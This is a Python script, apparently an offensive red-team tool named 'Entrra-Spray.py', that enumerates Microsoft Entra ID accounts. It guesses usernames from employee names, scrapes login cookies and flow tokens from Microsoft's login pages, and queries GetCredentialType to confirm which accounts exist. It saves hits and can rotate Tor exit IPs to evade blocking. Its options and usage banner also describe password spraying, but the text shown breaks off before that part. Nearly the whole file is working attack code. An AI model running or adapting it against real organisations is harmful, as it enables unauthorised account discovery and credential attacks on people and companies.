import httpx
import re
import stem.control
import time
from urllib.parse import quote_plus
from urllib.parse import unquote, urlparse, parse_qs
import argparse
import getpass
import os
import sys


RESET = "\033[0m"
YELLOW = "\033[0;93m"
CYAN = "\033[0;36m"
BOLD_YELLOW = "\033[1;33m"
BOLD_RED = "\033[1;31m"
BOLD_GREEN = "\033[1;32m"
BACKGROUNG_YELLOW = "\033[0;43m"
BACKGROUNG_CYAN = "\033[0;46m"



def load_list(input_str):
    if os.path.isfile(input_str):
        with open(input_str, "r") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [input_str]


def generate_combinations(firstname, lastname):
    combinations = set()
    f = firstname.lower()
    l = lastname.lower()
    combinations.add(f)
    combinations.add(l)
    combinations.add(f + l)
    combinations.add(f + '.' + l)
    combinations.add(l + '.' + f)
    combinations.add(l + f)
    combinations.add(f + l[0])
    combinations.add(l + f[0])
    combinations.add(f + l[:2])
    combinations.add(f + l[:3])
    combinations.add(l + f[:2])
    combinations.add(l + f[:3])
    combinations.add(f[0] + l[0])
    combinations.add(l[0] + f[0])
    combinations.add(l[0] + '.' + f)
    combinations.add(f[0] + '.' + l)
    combinations.add(f + '.' + l[0])
    combinations.add(l + '.' + f[0])
    return sorted(combinations)



parser = argparse.ArgumentParser(
    formatter_class=argparse.RawTextHelpFormatter
)

parser.add_argument("-user", dest="user", help="Single username or path to usernames file")
parser.add_argument("-password", dest="password", help="Single password or path to passwords file")
parser.add_argument("-firstname", dest="firstname", help="First Name of employee")
parser.add_argument("-lastname", dest="lastname", help="Last Name of employee")
parser.add_argument("-tenantname", dest="tenantname", help="Tenant domain name")
parser.add_argument("-check", action="store_true", help="Enable check mode (check if identity exists in Entra - may return false positives)")
parser.add_argument("-proxytor", action="store_true", help="Route all traffic through TOR (requires Tor service running on localhost:9050). IP will renew every 4 minutes.")

args = parser.parse_args()

if len(sys.argv) == 1:
    print("""
Cool Tool For Enumeration and Validation User Accounts in Entra ID :]
        Red Team - Ab-Inbev
        Author - Shaked Wiessman

    python3 Entrra-Spray.py -user /home/usernames.txt | singleusername@domain.com -password /home/passwords.txt | SingleP@SSSw0rd -check
    python3 Entrra-Spray.py -user /home/usernames.txt | singleusername@domain.com -password /home/passwords.txt | SingleP@SSSw0rd -check -proxytor
    python3 Entrra-Spray.py -firstname Anheuser -lastname Busch -tenantname ab-inbev.com
    python3 Entrra-Spray.py -firstname Anheuser -lastname Busch -tenantname ab-inbev.com -proxytor

""")
    parser.print_help()
    sys.exit(0)


if args.user:
    usernames = load_list(args.user)
    
if args.password:
    passwords = load_list(args.password)

if args.firstname and args.lastname:
    combos = generate_combinations(args.firstname, args.lastname)

proxies = None

def get_tor_ip():
    try:
        with httpx.Client(transport=transport, timeout=20) as client:
            ip = client.get("https://check.torproject.org/api/ip").text.strip()
            print(f"{YELLOW}[i] Current TOR IP: {ip}{RESET}")
    except Exception as e:
        print(f"{BOLD_RED}[✗] Could not retrieve TOR IP: {e}{RESET}")

def renew_tor_ip():
    global last_ip_renewal
    try:
        with stem.control.Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(stem.Signal.NEWNYM)
            last_ip_renewal = time.time()
            print(f"{BOLD_YELLOW}[✓] Renewed TOR IP{RESET}")
            get_tor_ip()
    except Exception as e:
        print(f"{BOLD_RED}[✗] Failed to renew TOR IP: {e}{RESET}")


def get_pageid_from_response(response_text):
    match = re.search(r'<meta\s+name="PageID"\s+content="([^"]+)"', response_text)
    if match:
        return match.group(1)
    return None

transport = None
if args.proxytor:
    last_ip_renewal = time.time()
    renew_interval = 240
    proxies = "socks5h://127.0.0.1:9050"
    transport = httpx.HTTPTransport(proxy=proxies)
    get_tor_ip()  
    
        
with open("valid-users.txt", "w") as f:
    pass



########################################################################################################################

# Combination With First Name and Last Name with and with out Tor Proxy:
if args.firstname and args.lastname and args.tenantname and args.user is None and args.password is None:
    for username_combo in combos:
        username = f"{username_combo}@{args.tenantname}"
        
        # Proxt Tor Combination chekcing:
        if args.proxytor and transport and time.time() - last_ip_renewal >= renew_interval:
            renew_tor_ip()
        
            # Reques 1 a For getting cookies (With Tor Proxy) :] 
            url_login = "https://login.microsoftonline.com/"
            headers_login = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Sec-Purpose": "prefetch;prerender",
                "Purpose": "prefetch",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i",
            }

            try:
                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
                    response_login = client.get(url_login)
                    cookies_dict_login = dict(response_login.cookies)
                    cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
                    for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                            globals()[f"cookie_login{i}"] = cookie_login  
            
                for i in range(1, 5):
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        cookie_login = globals()[var_name]
                    else:
                        print(f"{var_name}: not found")
            
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_login}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_login}{RESET}")
               

            # Reques 2 a For getting two urls: (With Tor Proxy) :]      
            url_geturls = "https://www.office.com/login"
            headers_geturls = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            }
                
            try: 
                with httpx.Client(transport=transport, timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
                    response_geturls = client.get(url_geturls)
                    location = response_geturls.headers.get("location")
                    if not location:
                        raise Exception("Redirect Location header not found")
                                    
                url1 = location + "&sso_reload=true"
                url2 = location
                            
                cookie_header = ""
                for i in range(1, 20):  
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        ck = globals()[var_name]
                        cookie_header += f"{ck['name']}={ck['value']}; "
            
                cookie_header = cookie_header.strip().rstrip(";")
            
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_geturls}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_geturls} {RESET}")


            # Reques 3 a For getting flowtoken parameter: (With Tor Proxy) :]      
            headers_ulrs = {
                "Host": "login.microsoftonline.com",
                "Cookie": cookie_header,
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i"
            }
            
            try: 
                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response2 = client.get(url1)
                    cookies_dict2 = dict(response2.cookies)
                    cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
                    for i, cookie2 in enumerate(cookies_list2[:6], 1):  
                        globals()[f"cookie_url1{i}"] = cookie2

                html = response2.text.replace("\\u0026", "&")
                match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                if not match_reset:
                    raise Exception("Reset URL not found")
                                
                decoded_reset = unquote(match_reset.group())
                inner_url = decoded_reset.split("ru=", 1)[-1]
                
                match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                flowtoken = match_flow.group(1) if match_flow else None

            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url1} and {url2}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")


            # Reques 4 Checking if user is exsit: (With Tor Proxy) :] 
            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
            headers_UserExsit = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Hpgid": "1104",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Hpgact": "1800",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
                "Content-Type": "application/json; charset=UTF-8",
                "Origin": "https://login.microsoftonline.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=1, i"
            }
            
            payload_UserExsit = {
                "username": f"{username}",
                "flowToken": f"{flowtoken}"
            }
                
            try:
                with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
                    response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                    if '"FederationRedirectUrl"' in response_UserExsit.text:
                        print(f"{BOLD_YELLOW}[><] Can not enumeration if username is exist, login page is redirected to Federation Server {RESET}")
                        continue
                    if '"IfExistsResult":0' in response_UserExsit.text:
                        print(f"{BOLD_GREEN}[✓] Username: {username} is exists{RESET}")
                        with open("valid-users.txt", "a") as log_file:
                            log_file.write(f"{username}\n")
                        break
                    else:
                        print(f"{BOLD_RED}[✗] Username: {username} is not exists{RESET}")
                        continue
                                            
                    
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_UserExsit}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")

        # Proxt Tor Combination chekcing:
        else: 
            # Reques 1 a For getting cookies (With-out Tor Proxy) :]
            url_login = "https://login.microsoftonline.com/"
            headers_login = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Sec-Purpose": "prefetch;prerender",
                "Purpose": "prefetch",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i",
            }

            try:
                with httpx.Client(timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
                    response_login = client.get(url_login)
                    cookies_dict_login = dict(response_login.cookies)
                    cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
                    for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                            globals()[f"cookie_login{i}"] = cookie_login  
            
                for i in range(1, 5):
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        cookie_login = globals()[var_name]
                    else:
                        print(f"{var_name}: not found")
            
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_login}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_login}{RESET}")
               
               
               
            # Reques 2 a For getting two urls: (With-out Tor Proxy) :] 
            url_geturls = "https://www.office.com/login"
            headers_geturls = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            }
                
            try: 
                with httpx.Client(timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
                    response_geturls = client.get(url_geturls)
                    location = response_geturls.headers.get("location")
                    if not location:
                        raise Exception("Redirect Location header not found")
                                    
                url1 = location + "&sso_reload=true"
                url2 = location
                            
                cookie_header = ""
                for i in range(1, 20):  
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        ck = globals()[var_name]
                        cookie_header += f"{ck['name']}={ck['value']}; "
            
                cookie_header = cookie_header.strip().rstrip(";")
            
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_geturls}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_geturls} {RESET}")

 
            # Reques 3 a For getting flowtoken parameter: (With-out Tor Proxy) :]
            headers_ulrs = {
                "Host": "login.microsoftonline.com",
                "Cookie": cookie_header,
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i"
            }
            
            try: 
                with httpx.Client(timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response2 = client.get(url1)
                    cookies_dict2 = dict(response2.cookies)
                    cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
                    for i, cookie2 in enumerate(cookies_list2[:6], 1):  
                        globals()[f"cookie_url1{i}"] = cookie2

                html = response2.text.replace("\\u0026", "&")
                match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                if not match_reset:
                    raise Exception("Reset URL not found")
                                
                decoded_reset = unquote(match_reset.group())
                inner_url = decoded_reset.split("ru=", 1)[-1]
                
                match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                flowtoken = match_flow.group(1) if match_flow else None

            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url1} and {url2}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")


            # Reques 4 Checking if user is exsit: (With-out Tor Proxy) :] 
            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
            headers_UserExsit = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Hpgid": "1104",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Hpgact": "1800",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
                "Content-Type": "application/json; charset=UTF-8",
                "Origin": "https://login.microsoftonline.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=1, i"
            }
            
            payload_UserExsit = {
                "username": f"{username}",
                "flowToken": f"{flowtoken}"
            }
                
            try:
                with httpx.Client(timeout=20, http2=True ) as client:
                    response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                    if '"FederationRedirectUrl"' in response_UserExsit.text:
                        print(f"{BOLD_YELLOW}[><] Can not enumeration if username is exist, login page is redirected to Federation Server {RESET}")
                        continue
                    if '"IfExistsResult":0' in response_UserExsit.text:
                        print(f"{BOLD_GREEN}[✓] Username: {username} is exists{RESET}")
                        with open("valid-users.txt", "a") as log_file:
                            log_file.write(f"{username}\n")
                        break
                    else:
                        print(f"{BOLD_RED}[✗] Username: {username} is not exists{RESET}")
                        continue        
                    
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_UserExsit}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")



#New Function of Checking vaild user account

if args.user and args.check and args.password is None and args.firstname is None and args.lastname is None and args.tenantname is None:
    for username in usernames:
        if args.proxytor and transport and time.time() - last_ip_renewal >= renew_interval:
            renew_tor_ip()
            
            # Reques 1 a For getting cookies (With Tor Proxy) :]          
            url_login = "https://login.microsoftonline.com/"
            headers_login = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Sec-Purpose": "prefetch;prerender",
                "Purpose": "prefetch",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i",
            }
                
            try:
                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
                    response_login = client.get(url_login)
                    cookies_dict_login = dict(response_login.cookies)
                    cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
                for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                        globals()[f"cookie_login{i}"] = cookie_login
                            #print(f"Var Created: cookie{i} = {{'name': '{cookie['name']}', 'value': '{cookie['value']}'}}")
    
                for i in range(1, 5):
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        cookie_login = globals()[var_name]
                    else:
                        print(f"{var_name}: not found")
    
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_login}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_login}{RESET}")
                

            # Reques 2 a For getting two urls: (With Tor Proxy) :] 
            url_geturls = "https://www.office.com/login"
            headers_geturls = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            }
            try: 
                with httpx.Client(transport=transport, timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
                    response_geturls = client.get(url_geturls)
                    location = response_geturls.headers.get("location")
                    if not location:
                        raise Exception("Redirect Location header not found")
                            
                url1 = location + "&sso_reload=true"
                url2 = location
                    
                cookie_header = ""
                for i in range(1, 20):  
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        ck = globals()[var_name]
                        cookie_header += f"{ck['name']}={ck['value']}; "
    
                cookie_header = cookie_header.strip().rstrip(";")
    
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_geturls}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_geturls} {RESET}")
    
    
            # Reques 3 a For getting flowtoken parameter: (With Tor Proxy) :]
            headers_ulrs = {
                "Host": "login.microsoftonline.com",
                "Cookie": cookie_header,
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i"
            }
            try: 
                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response2 = client.get(url1)
                    cookies_dict2 = dict(response2.cookies)
                    cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
                    for i, cookie2 in enumerate(cookies_list2[:6], 1):  
                        globals()[f"cookie_url1{i}"] = cookie2
                        #print(f"varb created: cookie_url1{i} = {{'name': '{cookie2['name']}', 'value': '{cookie2['value']}'}}")
    
                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response3 = client.get(url2)
                    cookies_dict3 = dict(response3.cookies)
                    cookies_list3 = [{"name": name, "value": value} for name, value in cookies_dict3.items()]
                    for i, cookie3 in enumerate(cookies_list3[:1], 1):  
                        globals()[f"cookie_url2{i}"] = cookie3
                        #print(f"varb created: cookie_url2{i} = {{'name': '{cookie3['name']}', 'value': '{cookie3['value']}'}}")
    
                html = response2.text.replace("\\u0026", "&")
                match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                if not match_reset:
                    raise Exception("Reset URL not found")
                        
                decoded_reset = unquote(match_reset.group())
                inner_url = decoded_reset.split("ru=", 1)[-1]
                parsed_inner = urlparse(inner_url)
                ctx = parse_qs(parsed_inner.query).get("ctx", [None])[0]
    
                match_canary = re.search(r'"canary"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                canary = match_canary.group(1) if match_canary else None
    
                match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                flowtoken = match_flow.group(1) if match_flow else None
    
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url1} and {url2}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
                
                
            # Reques 4 Checking if user is exsit: (With Tor Proxy) :]
            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
            headers_UserExsit = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Hpgid": "1104",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Hpgact": "1800",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
                "Content-Type": "application/json; charset=UTF-8",
                "Origin": "https://login.microsoftonline.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=1, i"
            }
            payload_UserExsit = {
                "username": f"{username}",
                "flowToken": f"{flowtoken}"
            }
                
            try: 
                if args.check:
                    try:
                        with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
                            response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                            if '"FederationRedirectUrl"' in response_UserExsit.text:
                                print(f"{BOLD_YELLOW}[><] Can not enumeration if username is exist, login page is redirected to Federation Server {RESET}")
                                continue
                            if '"IfExistsResult":0' in response_UserExsit.text:
                                print(f"{BOLD_GREEN}[✓] Username: {username} is exists{RESET}")
                                with open("valid-users.txt", "a") as log_file:
                                    log_file.write(f"{username}\n")
                                pass
                            else:
                                print(f"{BOLD_RED}[✗] Username: {username} is not exists{RESET}")
                                continue
                                    
                    except httpx.ReadTimeout:
                        print(f"{BOLD_YELLOW}[!] Request timed out while checking user: {username}{RESET}")
                        continue
    
                    except httpx.RequestError as e:
                        print(f"{BOLD_YELLOW}[!] Request error for {username}: {e}{RESET}")
                        continue
            
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_UserExsit}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
                print(f"{BOLD_YELLOW}[!] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
                    
        else:
            
            # Reques 1 a For getting cookies (With-out Tor Proxy) :]
            url_login = "https://login.microsoftonline.com/"
            headers_login = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Sec-Purpose": "prefetch;prerender",
                "Purpose": "prefetch",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i",
            }
                
            try:
                with httpx.Client(timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
                    response_login = client.get(url_login)
                    cookies_dict_login = dict(response_login.cookies)
                    cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
                for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                        globals()[f"cookie_login{i}"] = cookie_login
                            #print(f"Var Created: cookie{i} = {{'name': '{cookie['name']}', 'value': '{cookie['value']}'}}")
    
                for i in range(1, 5):
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        cookie_login = globals()[var_name]
                    else:
                        print(f"{var_name}: not found")
    
            except httpx.ReadTimeout:
                print(f"{BOLD_YELLOW}[!] Timeout occurred while connecting to {url_login}{RESET}")
            except httpx.RequestError as e:
                print(f"{BOLD_YELLOW}[!] Request error: {e}{RESET}")
            except Exception:
